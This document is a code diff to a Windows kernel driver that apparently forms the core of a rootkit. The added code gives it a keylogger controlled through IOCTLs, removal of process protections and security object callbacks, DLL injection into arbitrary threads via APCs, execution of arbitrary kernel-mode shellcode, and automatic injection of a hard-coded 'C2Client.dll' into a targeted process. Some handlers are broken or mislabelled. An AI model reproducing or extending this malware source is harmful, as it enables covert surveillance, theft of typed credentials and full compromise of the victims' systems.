@@ -1,5 +1,6 @@
-
 #include "MarkDriver.h"
+#include "Memory.h"
+#include "Utils.h"
 #include "Macros.h"
 #include "Common.h"
 #include "Apc.h"
@@ -9,6 +10,8 @@
 
 
 Globals g_Globals = { 0 };
+
+constexpr CHAR* NETWORKING_DLL_PATH = "..\\C2Client.dll";
 
 extern "C"
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
@@ -63,6 +66,12 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 
 		return status;
 	}
+
+	g_Globals.HookManager = new (POOL_FLAG_PAGED) IrpHookManager();
+	g_Globals.Keylogger = new (POOL_FLAG_PAGED) Keylogger(*g_Globals.HookManager);
+	g_Globals.ProtectionRemover = new (POOL_FLAG_PAGED) Protections::ProtectionRemover();
+	g_Globals.ModuleFinder = new (POOL_FLAG_PAGED) ModuleFinder();
+
 	deviceObject->Flags |= DO_BUFFERED_IO;
 
 	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i) {
@@ -80,6 +89,11 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 */
 void DriverUnload(PDRIVER_OBJECT DriverObject) {
 	UNICODE_STRING symlinkName = RTL_CONSTANT_STRING(SYMLINK_NAME);
+
+	delete g_Globals.Keylogger;
+	delete g_Globals.HookManager;
+	delete g_Globals.ProtectionRemover;
+	delete g_Globals.ModuleFinder;
 
 	::IoDeleteSymbolicLink(&symlinkName);
 	::IoDeleteDevice(DriverObject->DeviceObject);
@@ -103,8 +117,28 @@ NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP Irp) {
 	case IOCTL_COPY_TO_MEMORY:
 		status = HandleCopyToMemory(Irp, currentStackLocation);
 		break;
+	case IOCTL_START_KEYLOGGING:
+		status = HandleStartKeylogging(Irp);
+		break;
+	case IOCTL_QUERY_KEYLOGGING:
+		status = HandleQueryKeylogging(Irp, currentStackLocation);
+		break;
+	case IOCTL_END_KEYLOGGING:
+		status = HandleEndKeylogging(Irp);
+		break;
+	case IOCTL_REMOVE_CALLBACKS:
+		status = HandleRemoveCallacks(Irp, currentStackLocation);
+		break;
+	case IOCTL_INJECT_LIBRARY_TO_PROCESS:
+		status = HandleInjectLibraryToProcess(Irp, currentStackLocation);
+		break;
+	case IOCTL_REMOVE_PROTECTION:
+		status = HandleRemoveProtection(Irp, currentStackLocation);
+		break;
 	case IOCTL_RESTORE_PROTECTION:
-		status = HandleRestoreProtection(Irp);
+		status = HandleRestoreProtection(Irp, currentStackLocation);
+		break;
+	case IOCTL_RUN_KM_SHELLCODE:
 		break;
 	default:
 		LOG_FAIL_VA("Received unsupported ioctl %ul", ioctlParameters.IoControlCode);
@@ -119,38 +153,157 @@ NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP Irp) {
 	Handles a copy-to-memory request
 */
 NTSTATUS HandleCopyToMemory(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
-	auto& ioctlParameters = CurrentStackLocation->Parameters.DeviceIoControl;
 	LOG_SUCCESS(STRINGIFY(IOCTL_COPY_TO_MEMORY) " called");
-	if (ioctlParameters.InputBufferLength != sizeof(CopyToMemoryParams)) {
-		LOG_FAIL_VA("Invalid buffer size %ul", ioctlParameters.InputBufferLength);
+
+	const auto* params = Utils::ValidateFixedSizeInput<CopyToMemoryParams>(Irp, CurrentStackLocation);
+	if (params == nullptr) {
 		return STATUS_BUFFER_TOO_SMALL;
 	}
-	const auto* params = static_cast<CopyToMemoryParams*>(Irp->AssociatedIrp.SystemBuffer);
 	Irp->IoStatus.Information = 0;
 	return CopyToReadOnlyBuffer(params->Dest, params->Source, params->Length);
+}
+
+NTSTATUS HandleStartKeylogging(PIRP Irp) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
+	g_Globals.Keylogger->StartLogging();
+	Irp->IoStatus.Information = 0;
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS HandleQueryKeylogging(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_QUERY_KEYLOGGING) " called");
+
+	auto* outBuffer = Utils::ValidateAnysizeInput<KeyloggingOutputBuffer, UCHAR>(Irp, CurrentStackLocation, FIELD_OFFSET(KeyloggingOutputBuffer, OutputBufferLength));
+	if (outBuffer == nullptr) {
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+
+	g_Globals.Keylogger->GetLoggedChars(outBuffer->Buffer, &outBuffer->OutputBufferLength);
+	Irp->IoStatus.Information = outBuffer->OutputBufferLength;
+	return STATUS_SUCCESS;
+
+}
+
+NTSTATUS HandleEndKeylogging(PIRP Irp) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
+	g_Globals.Keylogger->EndKeylogging();
+	Irp->IoStatus.Information = 0;
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS HandleRemoveCallacks(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_REMOVE_CALLBACKS) " called");
+	auto* params = Utils::ValidateFixedSizeInput<RemoveCallbacksParams>(Irp, CurrentStackLocation);
+	if (params == nullptr) {
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+	params->ImageName[15] = 0; // make sure it's null terminated
+	Irp->IoStatus.Information = 0;
+	return Protections::RemoveProtectingObjectCallbacks(params->ImageName);
+}
+
+NTSTATUS HandleInjectLibraryToProcess(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
+	Irp->IoStatus.Information = 0;
+	auto* params = Utils::ValidateAnysizeInput<InjectLibraryParams, CHAR>(Irp, CurrentStackLocation, FIELD_OFFSET(InjectLibraryParams, DllPath));
+	if (params == nullptr) {
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+	params->DllPath[MAX_PATH_LENGTH - 1] = 0;
+	
+	PETHREAD thread = nullptr;
+	auto status = PsLookupThreadByThreadId(params->Tid, &thread);
+	PRINT_AND_RETURN_IF_FAILED(status, "Failed to find thread by id");
+	
+	return QueueApc(InjectLibraryKernelApc, KernelMode, thread, params->DllPath);
+}
+
+NTSTATUS HandleRunKmShellcode(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
+	auto* params = Utils::ValidateFixedSizeInput<RunKmShellcodeParams>(Irp, CurrentStackLocation);
+	if (params == nullptr) {
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+
+	PoolPointer<UCHAR> shellcodeBuf(params->KmShellcodeSize);
+	PoolPointer<UCHAR> inputBuf(params->KmShellcodeSize);
+
+	// probe user pointer
+	__try {
+		ProbeForRead(params->KmShellcode, params->KmShellcodeSize, 1);
+		ProbeForRead(params->Input, params->InputLength, 1);
+
+		RtlCopyMemory(shellcodeBuf.get(), params->KmShellcode, params->KmShellcodeSize);
+		RtlCopyMemory(inputBuf.get(), params->Input, params->InputLength);
+	}
+	__except (EXCEPTION_CONTINUE_EXECUTION) {
+		LOG_FAIL("Failed to read from user supplied pointers");
+		return STATUS_ACCESS_VIOLATION;
+	}
+
+	// initialize parameters to km shellcode
+	ULONG outputLength = CurrentStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
+
+	PoolPointer<KmShellcodeParameters> shellcodeParameters;
+	shellcodeParameters->MmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
+	shellcodeParameters->KernelBase = g_Globals.ModuleFinder->GetModuleBaseByName("ntoskrnl.exe");
+	shellcodeParameters->Input = inputBuf.get();
+	shellcodeParameters->InputLength = inputBuf.length();
+	shellcodeParameters->Output = Irp->AssociatedIrp.SystemBuffer;
+	shellcodeParameters->OutputLength = &outputLength;
+
+	HANDLE shellcodeThread = nullptr;
+	auto status = PsCreateSystemThread(
+		&shellcodeThread,
+		GENERIC_ALL,
+		nullptr,
+		PsGetCurrentProcess(),
+		nullptr,
+		reinterpret_cast<PKSTART_ROUTINE>(shellcodeBuf.get()),
+		shellcodeParameters.get()
+	);
+	if (!NT_SUCCESS(status)) {
+		LOG_FAIL_WITH_STATUS("Failed to create system thread", status);
+		return status;
+	}
+	PVOID threadObject = nullptr;
+	status = ObReferenceObjectByHandle(shellcodeThread, GENERIC_ALL, *PsThreadType, KernelMode, &threadObject, nullptr);
+	if (!NT_SUCCESS(status)) {
+		LOG_FAIL_WITH_STATUS("Failed to reference shellcode thread by handle", status);
+		return status;
+	}
+
+	status = KeWaitForSingleObject(threadObject, Executive, KernelMode, false, nullptr);
+	if (!NT_SUCCESS(status)) {
+		LOG_FAIL_WITH_STATUS("Failed to wait for thread to finish", status);
+		return status;
+	}
+	LOG_SUCCESS("Successfully ran KM shellcode");
+	Irp->IoStatus.Information = outputLength;
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS HandleRemoveProtection(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_REMOVE_PROTECTION) " called");
+	auto* params = Utils::ValidateFixedSizeInput<RemoveProtectionParams>(Irp, CurrentStackLocation);
+	if (params == nullptr) {
+		return STATUS_BUFFER_TOO_SMALL;
+	}
+	Irp->IoStatus.Information = 0;
+	return g_Globals.ProtectionRemover->RemoveProcessProtection(params->Pid);
 }
 
 /*
 	Restores the protection of the process.
 */
-NTSTATUS HandleRestoreProtection(PIRP Irp) {
+NTSTATUS HandleRestoreProtection(PIRP Irp, PIO_STACK_LOCATION CurrentStackLocation) {
+	LOG_SUCCESS(STRINGIFY(IOCTL_RESTORE_PROTECTION) " called");
+	auto* params = Utils::ValidateFixedSizeInput<RestoreProtectionParams>(Irp, CurrentStackLocation);
+	if (params == nullptr) {
+		return STATUS_BUFFER_TOO_SMALL;
+	}
 	Irp->IoStatus.Information = 0;
-	auto requestorPid = ::UlongToHandle(::IoGetRequestorProcessId(Irp));
-	LOG_SUCCESS_VA(STRINGIFY(IOCTL_RESTORE_PROTECTION) " called, pid=0x%04x", ::HandleToUlong(requestorPid));
-
-	PEPROCESS process = nullptr;
-	auto status = ::PsLookupProcessByProcessId(requestorPid, &process);
-	PRINT_AND_RETURN_IF_FAILED(status, "Failed to find process from pid");
-
-	__try {
-		Ppl::ModifyProcessProtectionPolicy(process, g_Globals.Network.PrevProtectionLevel);
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		status = ::GetExceptionCode();
-		LOG_FAIL_WITH_STATUS(STRINGIFY(Ppl::ModifyProcessProtectionPolicy) " Failed", status);
-		return status;
-	}
-	return STATUS_SUCCESS;
+	return g_Globals.ProtectionRemover->RestoreProcessProtection(params->Pid);
 }
 
 /*
@@ -187,7 +340,7 @@ void OnCreateProcess(HANDLE, HANDLE ProcessId, BOOLEAN IsCreated)
 	::PsLookupProcessByProcessId(ProcessId, &process);
 	PUNICODE_STRING imageName = nullptr;
 	::SeLocateProcessImageName(process, &imageName);
-	UNICODE_STRING expectedImageNamePattern = RTL_CONSTANT_STRING(L"*" PROCESS_NAME);
+	UNICODE_STRING expectedImageNamePattern = RTL_CONSTANT_STRING(L"*" NETWORKING_PROCESS);
 	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, FALSE, nullptr)) {
 		LOG_SUCCESS_VA("Found matching process, pid=%04x", ::HandleToUlong(ProcessId));
 		g_Globals.Network.Pid = ProcessId;
@@ -202,7 +355,7 @@ void OnCreateThread(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN IsCreated)
 {
 	if (!IsCreated || ProcessId != g_Globals.Network.Pid || g_Globals.Network.FoundFirstThread)
 		return;
-	LOG_SUCCESS_VA("Running in primary thread of %ws, tid=0x%04x", PROCESS_NAME, ::HandleToUlong(ThreadId));
+	LOG_SUCCESS_VA("Running in primary thread of %ws, tid=0x%04x", NETWORKING_PROCESS, ::HandleToUlong(ThreadId));
 	g_Globals.Network.FoundFirstThread = true;
 	
 	auto status = STATUS_SUCCESS;
@@ -213,7 +366,7 @@ void OnCreateThread(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN IsCreated)
 		return;
 	}
 
-	status = QueueApc(InjectCode, KernelMode, thread);
+	status = QueueApc(InjectLibraryKernelApc, KernelMode, thread, NETWORKING_DLL_PATH);
 	if (!NT_SUCCESS(status)) {
 		LOG_FAIL_WITH_STATUS("Failed to queue kernel apc", status);
 		return;
@@ -223,14 +376,15 @@ void OnCreateThread(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN IsCreated)
 /*
 	Queue usermode APC to run shellcode.
 */
-void InjectCode(PVOID, PVOID, PVOID) {
+void InjectLibraryKernelApc(PVOID, PVOID DllPath, PVOID) {
 	LOG_SUCCESS("Kernel APC invoked");
 	NTSTATUS status = STATUS_SUCCESS;
 
+	auto* strDllPath = reinterpret_cast<PCHAR>(DllPath);
 	void* shellcodeAddress = nullptr;
 	size_t shellcodeSize = GetShellcodeSize();
 	void* dllNameAddress = nullptr;
-	auto dllNameSize = ::strlen(DLL_NAME) + 1;
+	auto dllNameSize = strlen(strDllPath) + 1;
 	LOG_SUCCESS_VA("Calculated shellcode size to be %zu", shellcodeSize);
 
 	do {
@@ -258,7 +412,7 @@ void InjectCode(PVOID, PVOID, PVOID) {
 			MEM_RESERVE | MEM_COMMIT,
 			PAGE_READWRITE); // wtf ilan why this was PAGE_READEXECUTE
 		BREAK_ON_ERROR(status, "Failed to allocate memory in new process");
-		if (dllNameSize < ::strlen(DLL_NAME) + 1) {
+		if (dllNameSize < strlen(strDllPath) + 1) {
 			LOG_FAIL("Couldn't allocate enough memory for the dll name");
 			break;
 		}
@@ -267,7 +421,7 @@ void InjectCode(PVOID, PVOID, PVOID) {
 		status = CopyToReadOnlyBuffer(shellcodeAddress, reinterpret_cast<const PVOID>(RunShellcode), shellcodeSize);
 		BREAK_ON_ERROR(status, "Failed to copy shellcode");
 
-		::RtlCopyMemory(dllNameAddress, DLL_NAME, dllNameSize);
+		::RtlCopyMemory(dllNameAddress, strDllPath, dllNameSize);
 
 		status = QueueApc(reinterpret_cast<PKNORMAL_ROUTINE>(shellcodeAddress), UserMode, KeGetCurrentThread(), dllNameAddress);
 		BREAK_ON_ERROR(status, "Failed to queue usermode apc");
